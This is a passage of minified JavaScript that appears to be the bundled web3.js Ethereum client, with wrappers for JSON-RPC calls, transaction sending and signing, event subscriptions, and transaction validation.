            return tm(this, void 0, void 0, (function*() {
                const i = kc({
                    format: "uint"
                }, n, $e);
                let o;
                if (Ka(t)) {
                    const n = kc({
                        format: "bytes32"
                    }, t, $e);
                    o = yield function(e, t, n) {
                        return Mf(this, void 0, void 0, (function*() {
                            return ps.validate(["bytes32", "hex"], [t, n]), e.send({
                                method: "eth_getTransactionByBlockHashAndIndex",
                                params: [t, n]
                            })
                        }))
                    }(e.requestManager, n, i)
                } else {
                    const n = rs(t) ? t : kc({
                        format: "uint"
                    }, t, $e);
                    o = yield function(e, t, n) {
                        return Mf(this, void 0, void 0, (function*() {
                            return ps.validate(["blockNumberOrTag", "hex"], [t, n]), e.send({
                                method: "eth_getTransactionByBlockNumberAndIndex",
                                params: [t, n]
                            })
                        }))
                    }(e.requestManager, n, i)
                }
                return ss(o) ? o : lh(o, null !== r && void 0 !== r ? r : e.defaultReturnFormat, {
                    fillInputAndData: !0
                })
            }))
        }

        function vm(e, t, n) {
            return tm(this, void 0, void 0, (function*() {
                const r = kc({
                    format: "bytes32"
                }, t, Xe);
                let i;
                try {
                    i = yield function(e, t) {
                        return Mf(this, void 0, void 0, (function*() {
                            return ps.validate(["bytes32"], [t]), e.send({
                                method: "eth_getTransactionReceipt",
                                params: [t]
                            })
                        }))
                    }(e.requestManager, r)
                } catch (o) {
                    if ("object" !== typeof o || ss(o) || !("message" in o) || "transaction indexing is in progress" !== o.message) throw o;
                    console.warn("Transaction indexing is in progress.")
                }
                return ss(i) ? i : kc(oh, i, null !== n && void 0 !== n ? n : e.defaultReturnFormat)
            }))
        }

        function ym(e, t) {
            let n = arguments.length > 2 && void 0 !== arguments[2] ? arguments[2] : e.defaultBlock,
                r = arguments.length > 3 ? arguments[3] : void 0;
            return tm(this, void 0, void 0, (function*() {
                const i = rs(n) ? n : kc({
                        format: "uint"
                    }, n, $e),
                    o = yield function(e, t, n) {
                        return Mf(this, void 0, void 0, (function*() {
                            return ps.validate(["address", "blockNumberOrTag"], [t, n]), e.send({
                                method: "eth_getTransactionCount",
                                params: [t, n]
                            })
                        }))
                    }(e.requestManager, t, i);
                return kc({
                    format: "uint"
                }, o, null !== r && void 0 !== r ? r : e.defaultReturnFormat)
            }))
        }

        function bm(e, t, n) {
            let r = arguments.length > 3 && void 0 !== arguments[3] ? arguments[3] : {
                    checkRevertBeforeSending: !0
                },
                i = arguments.length > 4 ? arguments[4] : void 0;
            const o = new Rf(((a, s) => {
                setImmediate((() => {
                    (() => {
                        tm(this, void 0, void 0, (function*() {
                            const c = new em({
                                web3Context: e,
                                promiEvent: o,
                                options: r,
                                returnFormat: n
                            });
                            let l = Object.assign({}, t);
                            ss(i) || (l = yield i.processTransaction(l));
                            let u = lh(Object.assign(Object.assign({}, l), {
                                from: Ah("from", e, l),
                                to: Ah("to", e, l)
                            }), $e);
                            try {
                                let t;
                                u = yield c.populateGasPrice({
                                    transaction: l,
                                    transactionFormatted: u
                                }), yield c.checkRevertBeforeSending(u), c.emitSending(u), e.wallet && !ss(u.from) && (t = e.wallet.get(u.from));
                                const r = yield c.signAndSend({
                                    wallet: t,
                                    tx: u
                                }), i = kc({
                                    format: "bytes32"
                                }, r, null !== n && void 0 !== n ? n : e.defaultReturnFormat);
                                c.emitSent(u), c.emitTransactionHash(i);
                                const o = yield Bh(e, r, null !== n && void 0 !== n ? n : e.defaultReturnFormat), s = c.getReceiptWithEvents(kc(oh, o, null !== n && void 0 !== n ? n : e.defaultReturnFormat));
                                c.emitReceipt(s), a(yield c.handleResolve({
                                    receipt: s,
                                    tx: u
                                })), c.emitConfirmation({
                                    receipt: s,
                                    transactionHash: r
                                })
                            } catch (d) {
                                s(yield c.handleError({
                                    error: d,
                                    tx: u
                                }))
                            }
                        }))
                    })()
                }))
            }));
            return o
        }

        function wm(e, t, n) {
            let r = arguments.length > 3 && void 0 !== arguments[3] ? arguments[3] : e.defaultReturnFormat;
            var i;
            return tm(this, void 0, void 0, (function*() {
                const o = kc({
                    format: "bytes"
                }, t, Xe);
                if (null === (i = e.wallet) || void 0 === i ? void 0 : i.get(n)) {
                    const t = e.wallet.get(n).sign(o);
                    return kc(ah, t, r)
                }
                if ("number" === typeof n) throw new an(t, 'RPC method "eth_sign" does not support index signatures');
                const a = yield function(e, t, n) {
                    return Mf(this, void 0, void 0, (function*() {
                        return ps.validate(["address", "hex"], [t, n]), e.send({
                            method: "eth_sign",
                            params: [t, n]
                        })
                    }))
                }(e.requestManager, n, o);
                return kc({
                    format: "bytes"
                }, a, r)
            }))
        }

        function xm(e, t) {
            let n = arguments.length > 2 && void 0 !== arguments[2] ? arguments[2] : e.defaultReturnFormat;
            return tm(this, void 0, void 0, (function*() {
                const r = yield function(e, t) {
                    return Mf(this, void 0, void 0, (function*() {
                        return e.send({
                            method: "eth_signTransaction",
                            params: [t]
                        })
                    }))
                }(e.requestManager, lh(t, $e));
                return Ca(r) ? function(e, t) {
                    let n = arguments.length > 2 && void 0 !== arguments[2] ? arguments[2] : {
                        fillInputAndData: !1
                    };
                    return {
                        raw: kc({
                            format: "bytes"
                        }, e, t),
                        tx: lh(Object.assign(Object.assign({}, gf.fromSerializedData(ks(e)).toJSON()), {
                            hash: As(Sc(ks(e))),
                            type: Vf(ks(e))
                        }), t, {
                            fillInputAndData: n.fillInputAndData
                        })
                    }
                }(r, n, {
                    fillInputAndData: !0
                }) : {
                    raw: kc({
                        format: "bytes"
                    }, r.raw, n),
                    tx: lh(r.tx, n, {
                        fillInputAndData: !0
                    })
                }
            }))
        }

        function Am(e, t) {
            let n = arguments.length > 2 && void 0 !== arguments[2] ? arguments[2] : e.defaultBlock,
                r = arguments.length > 3 && void 0 !== arguments[3] ? arguments[3] : e.defaultReturnFormat;
            return tm(this, void 0, void 0, (function*() {
                const i = rs(n) ? n : kc({
                        format: "uint"
                    }, n, $e),
                    o = yield function(e, t, n) {
                        return Mf(this, void 0, void 0, (function*() {
                            return ps.validate(["blockNumberOrTag"], [n]), e.send({
                                method: "eth_call",
                                params: [t, n]
                            })
                        }))
                    }(e.requestManager, lh(t, $e), i);
                return kc({
                    format: "bytes"
                }, o, r)
            }))
        }

        function km(e, t) {
            let n = arguments.length > 2 && void 0 !== arguments[2] ? arguments[2] : e.defaultBlock,
                r = arguments.length > 3 ? arguments[3] : void 0;
            return tm(this, void 0, void 0, (function*() {
                const i = lh(t, $e),
                    o = rs(n) ? n : kc({
                        format: "uint"
                    }, n, $e),
                    a = yield function(e, t, n) {
                        return Mf(this, void 0, void 0, (function*() {
                            return ps.validate(["blockNumberOrTag"], [n]), e.send({
                                method: "eth_estimateGas",
                                params: [t, n]
                            })
                        }))
                    }(e.requestManager, i, o);
                return kc({
                    format: "uint"
                }, a, null !== r && void 0 !== r ? r : e.defaultReturnFormat)
            }))
        }

        function Em(e, t, n) {
            return tm(this, void 0, void 0, (function*() {
                let {
                    toBlock: r,
                    fromBlock: i
                } = t;
                ss(r) || "number" !== typeof r && "bigint" !== typeof r || (r = Cs(r)), ss(i) || "number" !== typeof i && "bigint" !== typeof i || (i = Cs(i));
                const o = Object.assign(Object.assign({}, t), {
                        fromBlock: i,
                        toBlock: r
                    }),
                    a = yield function(e, t) {
                        return Mf(this, void 0, void 0, (function*() {
                            return ps.validate(["filter"], [t]), e.send({
                                method: "eth_getLogs",
                                params: [t]
                            })
                        }))
                    }(e.requestManager, o);
                return a.map((t => "string" === typeof t ? t : kc(rh, t, null !== n && void 0 !== n ? n : e.defaultReturnFormat)))
            }))
        }

        function Sm(e, t) {
            return tm(this, void 0, void 0, (function*() {
                const n = yield function(e) {
                    return Mf(this, void 0, void 0, (function*() {
                        return e.send({
                            method: "eth_chainId",
                            params: []
                        })
                    }))
                }(e.requestManager);
                return kc({
                    format: "uint"
                }, n, null !== t && void 0 !== t ? t : e.defaultReturnFormat)
            }))
        }

        function Cm(e, t, n) {
            let r = arguments.length > 3 && void 0 !== arguments[3] ? arguments[3] : e.defaultBlock,
                i = arguments.length > 4 ? arguments[4] : void 0;
            return tm(this, void 0, void 0, (function*() {
                const o = n.map((e => kc({
                        format: "bytes"
                    }, e, $e))),
                    a = rs(r) ? r : kc({
                        format: "uint"
                    }, r, $e),
                    s = yield function(e, t, n, r) {
                        return Mf(this, void 0, void 0, (function*() {
                            return ps.validate(["address", "bytes32[]", "blockNumberOrTag"], [t, n, r]), e.send({
                                method: "eth_getProof",
                                params: [t, n, r]
                            })
                        }))
                    }(e.requestManager, t, o, a);
                return kc(ch, s, null !== i && void 0 !== i ? i : e.defaultReturnFormat)
            }))
        }

        function _m(e, t) {
            let n = arguments.length > 2 && void 0 !== arguments[2] ? arguments[2] : e.defaultBlock,
                r = arguments.length > 3 ? arguments[3] : void 0,
                i = arguments.length > 4 ? arguments[4] : void 0;
            return tm(this, void 0, void 0, (function*() {
                const o = kc({
                        format: "uint"
                    }, t, $e),
                    a = rs(n) ? n : kc({
                        format: "uint"
                    }, n, $e),
                    s = kc({
                        type: "array",
                        items: {
                            format: "uint"
                        }
                    }, r, yh),
                    c = yield function(e, t, n, r) {
                        return Mf(this, void 0, void 0, (function*() {
                            ps.validate(["hex", "blockNumberOrTag"], [t, n]);
                            for (const e of r) ps.validate(["number"], [e]);
                            return e.send({
                                method: "eth_feeHistory",
                                params: [t, n, r]
                            })
                        }))
                    }(e.requestManager, o, a, s);
                return kc(sh, c, null !== i && void 0 !== i ? i : e.defaultReturnFormat)
            }))
        }

        function Im(e, t) {
            let n = arguments.length > 2 && void 0 !== arguments[2] ? arguments[2] : e.defaultBlock,
                r = arguments.length > 3 ? arguments[3] : void 0;
            return tm(this, void 0, void 0, (function*() {
                const i = rs(n) ? n : kc({
                        format: "uint"
                    }, n, $e),
                    o = yield function(e, t, n) {
                        return Mf(this, void 0, void 0, (function*() {
                            return ps.validate(["blockNumberOrTag"], [n]), e.send({
                                method: "eth_createAccessList",
                                params: [t, n]
                            })
                        }))
                    }(e.requestManager, lh(t, $e), i);
                return kc(Kf, o, null !== r && void 0 !== r ? r : e.defaultReturnFormat)
            }))
        }

        function Pm(e, t, n, r, i) {
            return tm(this, void 0, void 0, (function*() {
                const o = yield function(e, t, n) {
                    let r = arguments.length > 3 && void 0 !== arguments[3] && arguments[3];
                    return Mf(this, void 0, void 0, (function*() {
                        return ps.validate(["address"], [t]), e.send({
                            method: "eth_signTypedData".concat(r ? "" : "_v4"),
                            params: [t, n]
                        })
                    }))
                }(e.requestManager, t, n, r);
                return kc({
                    format: "bytes"
                }, o, null !== i && void 0 !== i ? i : e.defaultReturnFormat)
            }))
        }
        class Tm extends jl {
            _buildSubscriptionParams() {
                return ["logs", this.args]
            }
            formatSubscriptionResult(e) {
                return kc(rh, e, super.returnFormat)
            }
        }
        class Bm extends jl {
            _buildSubscriptionParams() {
                return ["newPendingTransactions"]
            }
            formatSubscriptionResult(e) {
                return kc({
                    format: "string"
                }, e, super.returnFormat)
            }
        }
        class Nm extends jl {
            _buildSubscriptionParams() {
                return ["newHeads"]
            }
            formatSubscriptionResult(e) {
                return kc(nh, e, super.returnFormat)
            }
        }
        class Om extends jl {
            _buildSubscriptionParams() {
                return ["syncing"]
            }
            _processSubscriptionResult(e) {
                if ("boolean" === typeof e) this.emit("changed", e);
                else {
                    const t = Object.fromEntries(Object.entries(e.status).map((e => {
                        let [t, n] = e;
                        return [t.charAt(0).toLowerCase() + t.substring(1), n]
                    })));
                    this.emit("changed", e.syncing), this.emit("data", kc(ih, t, super.returnFormat))
                }
            }
        }
        var Rm = function(e, t, n, r) {
            return new(n || (n = Promise))((function(i, o) {
                function a(e) {
                    try {
                        c(r.next(e))
                    } catch (Qy) {
                        o(Qy)
                    }
                }

                function s(e) {
                    try {
                        c(r.throw(e))
                    } catch (Qy) {
                        o(Qy)
                    }
                }

                function c(e) {
                    var t;
                    e.done ? i(e.value) : (t = e.value, t instanceof n ? t : new n((function(e) {
                        e(t)
                    }))).then(a, s)
                }
                c((r = r.apply(e, t || [])).next())
            }))
        };
        const Mm = {
            logs: Tm,
            newPendingTransactions: Bm,
            newHeads: Nm,
            syncing: Om,
            pendingTransactions: Bm,
            newBlockHeaders: Nm
        };
        class jm extends Tf {
            constructor(e) {
                "string" === typeof e || Il(e) ? super({
                    provider: e,
                    registeredSubscriptions: Mm
                }) : e.registeredSubscriptions ? super(e) : (super(Object.assign(Object.assign({}, e), {
                    registeredSubscriptions: Mm
                })), this.getFeeData = this.calculateFeeData)
            }
            setTransactionMiddleware(e) {
                this.transactionMiddleware = e
            }
            getTransactionMiddleware() {
                return this.transactionMiddleware
            }
            getProtocolVersion() {
                return Rm(this, void 0, void 0, (function*() {
                    return function(e) {
                        return Mf(this, void 0, void 0, (function*() {
                            return e.send({
                                method: "eth_protocolVersion",
                                params: []
                            })
                        }))
                    }(this.requestManager)
                }))
            }
            isSyncing() {
                return Rm(this, void 0, void 0, (function*() {
                    return jf(this.requestManager)
                }))
            }
            getCoinbase() {
                return Rm(this, void 0, void 0, (function*() {
                    return function(e) {
                        return Mf(this, void 0, void 0, (function*() {
                            return e.send({
                                method: "eth_coinbase",
                                params: []
                            })
                        }))
                    }(this.requestManager)
                }))
            }
            isMining() {
                return Rm(this, void 0, void 0, (function*() {
                    return function(e) {
                        return Mf(this, void 0, void 0, (function*() {
                            return e.send({
                                method: "eth_mining",
                                params: []
                            })
                        }))
                    }(this.requestManager)
                }))
            }
            getHashrate(e) {
                var t;
                return void 0 === e && (e = null !== (t = this.defaultReturnFormat) && void 0 !== t ? t : Xe), Rm(this, void 0, void 0, (function*() {
                    return this.getHashRate(e)
                }))
            }
            getHashRate() {
                let e = arguments.length > 0 && void 0 !== arguments[0] ? arguments[0] : this.defaultReturnFormat;
                return Rm(this, void 0, void 0, (function*() {
                    return rm(this, e)
                }))
            }
            getGasPrice() {
                let e = arguments.length > 0 && void 0 !== arguments[0] ? arguments[0] : this.defaultReturnFormat;
                return Rm(this, void 0, void 0, (function*() {
                    return im(this, e)
                }))
            }
            getMaxPriorityFeePerGas() {
                let e = arguments.length > 0 && void 0 !== arguments[0] ? arguments[0] : this.defaultReturnFormat;
                return Rm(this, void 0, void 0, (function*() {
                    return om(this, e)
                }))
            }
            calculateFeeData() {
                let e = arguments.length > 0 && void 0 !== arguments[0] ? arguments[0] : BigInt(2),
                    t = arguments.length > 1 && void 0 !== arguments[1] ? arguments[1] : ys.Gwei;
                var n;
                return Rm(this, void 0, void 0, (function*() {
                    const r = yield this.getBlock(void 0, !1), i = null !== (n = null === r || void 0 === r ? void 0 : r.baseFeePerGas) && void 0 !== n ? n : void 0;
                    let o, a, s;
                    try {
                        o = yield this.getGasPrice()
                    } catch (c) {}
                    try {
                        a = yield this.getMaxPriorityFeePerGas()
                    } catch (c) {}
                    return i && (a = null !== a && void 0 !== a ? a : t, s = i * e + a), {
                        gasPrice: o,
                        maxFeePerGas: s,
                        maxPriorityFeePerGas: a,
                        baseFeePerGas: i
                    }
                }))
            }
            getAccounts() {
                var e;
                return Rm(this, void 0, void 0, (function*() {
                    return (null !== (e = yield function(e) {
                        return Mf(this, void 0, void 0, (function*() {
                            return e.send({
                                method: "eth_accounts",
                                params: []
                            })
                        }))
                    }(this.requestManager)) && void 0 !== e ? e : []).map((e => Qs(e)))
                }))
            }
            getBlockNumber() {
                let e = arguments.length > 0 && void 0 !== arguments[0] ? arguments[0] : this.defaultReturnFormat;
                return Rm(this, void 0, void 0, (function*() {
                    return am(this, e)
                }))
            }
            getBalance(e) {
                let t = arguments.length > 1 && void 0 !== arguments[1] ? arguments[1] : this.defaultBlock,
                    n = arguments.length > 2 && void 0 !== arguments[2] ? arguments[2] : this.defaultReturnFormat;
                return Rm(this, void 0, void 0, (function*() {
                    return sm(this, e, t, n)
                }))
            }
            getStorageAt(e, t) {
                let n = arguments.length > 2 && void 0 !== arguments[2] ? arguments[2] : this.defaultBlock,
                    r = arguments.length > 3 && void 0 !== arguments[3] ? arguments[3] : this.defaultReturnFormat;
                return Rm(this, void 0, void 0, (function*() {
                    return cm(this, e, t, n, r)
                }))
            }
            getCode(e) {
                let t = arguments.length > 1 && void 0 !== arguments[1] ? arguments[1] : this.defaultBlock,
                    n = arguments.length > 2 && void 0 !== arguments[2] ? arguments[2] : this.defaultReturnFormat;
                return Rm(this, void 0, void 0, (function*() {
                    return lm(this, e, t, n)
                }))
            }
            getBlock() {
                let e = arguments.length > 0 && void 0 !== arguments[0] ? arguments[0] : this.defaultBlock,
                    t = arguments.length > 1 && void 0 !== arguments[1] && arguments[1],
                    n = arguments.length > 2 && void 0 !== arguments[2] ? arguments[2] : this.defaultReturnFormat;
                return Rm(this, void 0, void 0, (function*() {
                    return um(this, e, t, n)
                }))
            }
            getBlockTransactionCount() {
                let e = arguments.length > 0 && void 0 !== arguments[0] ? arguments[0] : this.defaultBlock,
                    t = arguments.length > 1 && void 0 !== arguments[1] ? arguments[1] : this.defaultReturnFormat;
                return Rm(this, void 0, void 0, (function*() {
                    return dm(this, e, t)
                }))
            }
            getBlockUncleCount() {
                let e = arguments.length > 0 && void 0 !== arguments[0] ? arguments[0] : this.defaultBlock,
                    t = arguments.length > 1 && void 0 !== arguments[1] ? arguments[1] : this.defaultReturnFormat;
                return Rm(this, void 0, void 0, (function*() {
                    return fm(this, e, t)
                }))
            }
            getUncle() {
                let e = arguments.length > 0 && void 0 !== arguments[0] ? arguments[0] : this.defaultBlock,
                    t = arguments.length > 1 ? arguments[1] : void 0,
                    n = arguments.length > 2 && void 0 !== arguments[2] ? arguments[2] : this.defaultReturnFormat;
                return Rm(this, void 0, void 0, (function*() {
                    return hm(this, e, t, n)
                }))
            }
            getTransaction(e) {
                let t = arguments.length > 1 && void 0 !== arguments[1] ? arguments[1] : this.defaultReturnFormat;
                return Rm(this, void 0, void 0, (function*() {
                    const n = yield pm(this, e, t);
                    if (!n) throw new fn;
                    return n
                }))
            }
            getPendingTransactions() {
                let e = arguments.length > 0 && void 0 !== arguments[0] ? arguments[0] : this.defaultReturnFormat;
                return Rm(this, void 0, void 0, (function*() {
                    return mm(this, e)
                }))
            }
            getTransactionFromBlock() {
                let e = arguments.length > 0 && void 0 !== arguments[0] ? arguments[0] : this.defaultBlock,
                    t = arguments.length > 1 ? arguments[1] : void 0,
                    n = arguments.length > 2 && void 0 !== arguments[2] ? arguments[2] : this.defaultReturnFormat;
                return Rm(this, void 0, void 0, (function*() {
                    return gm(this, e, t, n)
                }))
            }
            getTransactionReceipt(e) {
                let t = arguments.length > 1 && void 0 !== arguments[1] ? arguments[1] : this.defaultReturnFormat;
                return Rm(this, void 0, void 0, (function*() {
                    const n = yield vm(this, e, t);
                    if (!n) throw new fn;
                    return n
                }))
            }
            getTransactionCount(e) {
                let t = arguments.length > 1 && void 0 !== arguments[1] ? arguments[1] : this.defaultBlock,
                    n = arguments.length > 2 && void 0 !== arguments[2] ? arguments[2] : this.defaultReturnFormat;
                return Rm(this, void 0, void 0, (function*() {
                    return ym(this, e, t, n)
                }))
            }
            sendTransaction(e) {
                return bm(this, e, arguments.length > 1 && void 0 !== arguments[1] ? arguments[1] : this.defaultReturnFormat, arguments.length > 2 ? arguments[2] : void 0, this.transactionMiddleware)
            }
            sendSignedTransaction(e) {
                return function(e, t, n) {
                    let r = arguments.length > 3 && void 0 !== arguments[3] ? arguments[3] : {
                        checkRevertBeforeSending: !0
                    };
                    const i = new Rf(((o, a) => {
                        setImmediate((() => {
                            (() => {
                                tm(this, void 0, void 0, (function*() {
                                    const s = new em({
                                            web3Context: e,
                                            promiEvent: i,
                                            options: r,
                                            returnFormat: n
                                        }),
                                        c = kc({
                                            format: "bytes"
                                        }, t, $e),
                                        l = gf.fromSerializedData(ws(ks(c))),
                                        u = Object.assign(Object.assign({}, l.toJSON()), {
                                            from: l.getSenderAddress().toString()
                                        });
                                    try {
                                        const {
                                            v: t,
                                            r: r,
                                            s: i
                                        } = u, a = nm(u, ["v", "r", "s"]);
                                        yield s.checkRevertBeforeSending(a), s.emitSending(c);
                                        const l = yield Ph(e, (() => tm(this, void 0, void 0, (function*() {
                                            return Ff(e.requestManager, c)
                                        }))));
                                        s.emitSent(c);
                                        const d = kc({
                                            format: "bytes32"
                                        }, l, null !== n && void 0 !== n ? n : e.defaultReturnFormat);
                                        s.emitTransactionHash(d);
                                        const f = yield Bh(e, l, null !== n && void 0 !== n ? n : e.defaultReturnFormat), h = s.getReceiptWithEvents(kc(oh, f, null !== n && void 0 !== n ? n : e.defaultReturnFormat));
                                        s.emitReceipt(h), o(yield s.handleResolve({
                                            receipt: h,
                                            tx: u
                                        })), s.emitConfirmation({
                                            receipt: h,
                                            transactionHash: l
                                        })
                                    } catch (d) {
                                        a(yield s.handleError({
                                            error: d,
                                            tx: u
                                        }))
                                    }
                                }))
                            })()
                        }))
                    }));
                    return i
                }(this, e, arguments.length > 1 && void 0 !== arguments[1] ? arguments[1] : this.defaultReturnFormat, arguments.length > 2 ? arguments[2] : void 0)
            }
            sign(e, t) {
                let n = arguments.length > 2 && void 0 !== arguments[2] ? arguments[2] : this.defaultReturnFormat;
                return Rm(this, void 0, void 0, (function*() {
                    return wm(this, e, t, n)
                }))
            }
            signTransaction(e) {
                let t = arguments.length > 1 && void 0 !== arguments[1] ? arguments[1] : this.defaultReturnFormat;
                return Rm(this, void 0, void 0, (function*() {
                    return xm(this, e, t)
                }))
            }
            call(e) {
                let t = arguments.length > 1 && void 0 !== arguments[1] ? arguments[1] : this.defaultBlock,
                    n = arguments.length > 2 && void 0 !== arguments[2] ? arguments[2] : this.defaultReturnFormat;
                return Rm(this, void 0, void 0, (function*() {
                    return Am(this, e, t, n)
                }))
            }
            estimateGas(e) {
                let t = arguments.length > 1 && void 0 !== arguments[1] ? arguments[1] : this.defaultBlock,
                    n = arguments.length > 2 && void 0 !== arguments[2] ? arguments[2] : this.defaultReturnFormat;
                return Rm(this, void 0, void 0, (function*() {
                    return km(this, e, t, n)
                }))
            }
            getPastLogs(e) {
                let t = arguments.length > 1 && void 0 !== arguments[1] ? arguments[1] : this.defaultReturnFormat;
                return Rm(this, void 0, void 0, (function*() {
                    return Em(this, e, t)
                }))
            }
            getWork() {
                return Rm(this, void 0, void 0, (function*() {
                    return function(e) {
                        return Mf(this, void 0, void 0, (function*() {
                            return e.send({
                                method: "eth_getWork",
                                params: []
                            })
                        }))
                    }(this.requestManager)
                }))
            }
            submitWork(e, t, n) {
                return Rm(this, void 0, void 0, (function*() {
                    return function(e, t, n, r) {
                        return Mf(this, void 0, void 0, (function*() {
                            return ps.validate(["bytes8", "bytes32", "bytes32"], [t, n, r]), e.send({
                                method: "eth_submitWork",
                                params: [t, n, r]
                            })
                        }))
                    }(this.requestManager, e, t, n)
                }))
            }
            requestAccounts() {
                return Rm(this, void 0, void 0, (function*() {
                    return function(e) {
                        return Mf(this, void 0, void 0, (function*() {
                            return e.send({
                                method: "eth_requestAccounts",
                                params: []
                            })
                        }))
                    }(this.requestManager)
                }))
            }
            getChainId() {
                let e = arguments.length > 0 && void 0 !== arguments[0] ? arguments[0] : this.defaultReturnFormat;
                return Rm(this, void 0, void 0, (function*() {
                    return Sm(this, e)
                }))
            }
            getNodeInfo() {
                return Rm(this, void 0, void 0, (function*() {
                    return function(e) {
                        return Mf(this, void 0, void 0, (function*() {
                            return e.send({
                                method: "web3_clientVersion",
                                params: []
                            })
                        }))
                    }(this.requestManager)
                }))
            }
            getProof(e, t) {
                let n = arguments.length > 2 && void 0 !== arguments[2] ? arguments[2] : this.defaultBlock,
                    r = arguments.length > 3 && void 0 !== arguments[3] ? arguments[3] : this.defaultReturnFormat;
                return Rm(this, void 0, void 0, (function*() {
                    return Cm(this, e, t, n, r)
                }))
            }
            getFeeHistory(e) {
                let t = arguments.length > 1 && void 0 !== arguments[1] ? arguments[1] : this.defaultBlock,
                    n = arguments.length > 2 ? arguments[2] : void 0,
                    r = arguments.length > 3 && void 0 !== arguments[3] ? arguments[3] : this.defaultReturnFormat;
                return Rm(this, void 0, void 0, (function*() {
                    return _m(this, e, t, n, r)
                }))
            }
            createAccessList(e) {
                let t = arguments.length > 1 && void 0 !== arguments[1] ? arguments[1] : this.defaultBlock,
                    n = arguments.length > 2 && void 0 !== arguments[2] ? arguments[2] : this.defaultReturnFormat;
                return Rm(this, void 0, void 0, (function*() {
                    return Im(this, e, t, n)
                }))
            }
            signTypedData(e, t, n, r) {
                var i;
                return void 0 === n && (n = !1), void 0 === r && (r = null !== (i = this.defaultReturnFormat) && void 0 !== i ? i : Xe), Rm(this, void 0, void 0, (function*() {
                    return Pm(this, e, t, n, r)
                }))
            }
            subscribe(e, t, n) {
                var r, i;
                return void 0 === n && (n = null !== (r = this.defaultReturnFormat) && void 0 !== r ? r : Xe), Rm(this, void 0, void 0, (function*() {
                    const r = yield null === (i = this.subscriptionManager) || void 0 === i ? void 0 : i.subscribe(e, t, n);
                    return r instanceof Tm && "logs" === e && "object" === typeof t && !cc(t.fromBlock) && Number.isFinite(Number(t.fromBlock)) && setImmediate((() => {
                        this.getPastLogs(t).then((e => {
                            for (const t of e) r._processSubscriptionResult(t)
                        })).catch((e => {
                            r._processSubscriptionError(e)
                        }))
                    })), r
                }))
            }
            static shouldClearSubscription(e) {
                let {
                    sub: t
                } = e;
                return !(t instanceof Om)
            }
            clearSubscriptions() {
                let e = arguments.length > 0 && void 0 !== arguments[0] && arguments[0];
                var t;
                return null === (t = this.subscriptionManager) || void 0 === t ? void 0 : t.unsubscribe(e ? jm.shouldClearSubscription : void 0)
            }
        }
        const Fm = e => {
                if (ss(e.gas) || !$a(e.gas) || ss(e.gasPrice) || !$a(e.gasPrice)) throw new Cn({
                    gas: e.gas,
                    gasPrice: e.gasPrice
                });
                if (!ss(e.maxFeePerGas) || !ss(e.maxPriorityFeePerGas)) throw new Pn({
                    maxFeePerGas: e.maxFeePerGas,
                    maxPriorityFeePerGas: e.maxPriorityFeePerGas
                })
            },
            Lm = e => {
                if (!ss(e.gasPrice) && "0x2" === e.type) throw new In(e.gasPrice);
                if ("0x0" === e.type || "0x1" === e.type) throw new Pn({
                    maxFeePerGas: e.maxFeePerGas,
                    maxPriorityFeePerGas: e.maxPriorityFeePerGas
                });
                if (ss(e.maxFeePerGas) || !$a(e.maxFeePerGas) || ss(e.maxPriorityFeePerGas) || !$a(e.maxPriorityFeePerGas)) throw new _n({
                    maxPriorityFeePerGas: e.maxPriorityFeePerGas,
                    maxFeePerGas: e.maxFeePerGas
                })
            },
            Dm = (e, t) => {
                if (!ss(t)) return void t(e);
                if ("object" !== typeof e || ss(e)) throw new Tn(e);
                (e => {
                    if (!ss(e.common)) {
                        if (ss(e.common.customChain)) throw new mn;
                        if (ss(e.common.customChain.chainId)) throw new gn;
                        if (!ss(e.chainId) && e.chainId !== e.common.customChain.chainId) throw new vn({
                            txChainId: e.chainId,
                            customChainId: e.common.customChain.chainId
                        })
                    }
                })(e), (e => {
                    if (!ss(e.common) && !ss(e.chain) && !ss(e.hardfork)) throw new wn;
                    if (!ss(e.chain) && ss(e.hardfork) || !ss(e.hardfork) && ss(e.chain)) throw new xn({
                        chain: e.chain,
                        hardfork: e.hardfork
                    })
                })(e), (e => {
                    if (!ss(e.common) && !ss(e.common.baseChain) && !ss(e.chain) && e.chain !== e.common.baseChain) throw new yn({
                        txChain: e.chain,
                        baseChain: e.common.baseChain
                    })
                })(e), (e => {
                    if (!ss(e.common) && !ss(e.common.hardfork) && !ss(e.hardfork) && e.hardfork !== e.common.hardfork) throw new bn({
                        txHardfork: e.hardfork,
                        commonHardfork: e.common.hardfork
                    })
                })(e);
                const n = lh(e, $e);
                if ((e => {
                        const t = !ss(e.gas) || !ss(e.gasLimit),
                            n = t && !ss(e.gasPrice),
                            r = t && !ss(e.maxPriorityFeePerGas) && !ss(e.maxFeePerGas);
                        if (!n && !r) throw new kn({
                            gas: e.gas,
                            gasPrice: e.gasPrice,
                            maxPriorityFeePerGas: e.maxPriorityFeePerGas,
                            maxFeePerGas: e.maxFeePerGas
                        });
                        if (n && r) throw new Sn({
                            gas: e.gas,
                            gasPrice: e.gasPrice,
                            maxPriorityFeePerGas: e.maxPriorityFeePerGas,
                            maxFeePerGas: e.maxFeePerGas
                        });
                        (n ? Fm : Lm)(e), (!ss(e.type) && e.type > "0x1" ? Lm : Fm)(e)
                    })(n), ss(n.nonce) || ss(n.chainId) || n.nonce.startsWith("-") || n.chainId.startsWith("-")) throw new Bn({
                    nonce: e.nonce,
                    chainId: e.chainId
                })
            };
        var Hm = function(e, t, n, r) {
            return new(n || (n = Promise))((function(i, o) {
                function a(e) {
                    try {
                        c(r.next(e))
                    } catch (Qy) {
                        o(Qy)
                    }
                }

                function s(e) {
                    try {
                        c(r.throw(e))
                    } catch (Qy) {
                        o(Qy)
                    }
                }

                function c(e) {
                    var t;
                    e.done ? i(e.value) : (t = e.value, t instanceof n ? t : new n((function(e) {
                        e(t)
                    }))).then(a, s)
                }
                c((r = r.apply(e, t || [])).next())
            }))
        };
        const Um = function(e, t, n) {
                let r = arguments.length > 3 && void 0 !== arguments[3] && arguments[3],
                    i = !(arguments.length > 4 && void 0 !== arguments[4]) || arguments[4];
                return Hm(void 0, void 0, void 0, (function*() {
                    const o = yield(a = {
                        transaction: e,
                        web3Context: t,
                        privateKey: n,
                        fillGasPrice: r,
                        fillGasLimit: i
                    }, xh(void 0, void 0, void 0, (function*() {
                        var e;
                        return (null !== (e = a.web3Context.transactionBuilder) && void 0 !== e ? e : Eh)(Object.assign(Object.assign({}, a), {
                            transaction: a.transaction
                        }))
                    })));
                    var a;
                    const s = lh(o, $e);
                    return Dm(s), gf.fromTxData((e => {
                        var t, n;
                        return {
                            nonce: e.nonce,
                            gasPrice: e.gasPrice,
                            gasLimit: null !== (t = e.gasLimit) && void 0 !== t ? t : e.gas,
